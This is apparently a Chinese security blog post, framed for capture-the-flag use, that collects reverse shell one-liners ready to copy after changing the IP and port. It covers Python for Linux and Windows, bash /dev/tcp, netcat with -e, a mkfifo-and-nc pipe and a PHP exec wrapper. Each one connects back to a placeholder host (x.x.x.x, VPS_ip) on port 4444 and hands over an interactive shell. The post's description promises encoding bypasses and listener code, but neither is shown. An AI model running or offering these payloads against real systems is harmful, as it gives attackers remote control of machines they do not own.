---
title: 反弹 Shell：常见写法与编码
date: 2026-11-22 08:11:00
author: Xendr1a
categories: [Web安全, Web基础]
tags: [反弹Shell, Linux, 提权]
description: bash、nc、python、php 等反弹 shell 写法和编码绕过。
toc: true
---

收集常见反弹 shell 一行命令与编码方式，附监听端写法，比赛时直接改 IP/端口。

## 反弹shell

```text
#linux
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

#win
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["cmd.exe","/c","cmd"]);'
```

```text
bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
```

```text
nc x.x.x.x 4444 -e /bin/bash  # -e：连接建立后执行/bin/bash
```

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc VPS_ip port >/tmp/f
```

```text
<?php
// Windows替换为cmd.exe
$shell = "/bin/bash -i >& /dev/tcp/x.x.x.x/4444 0>&1";
exec($shell);
?>
```
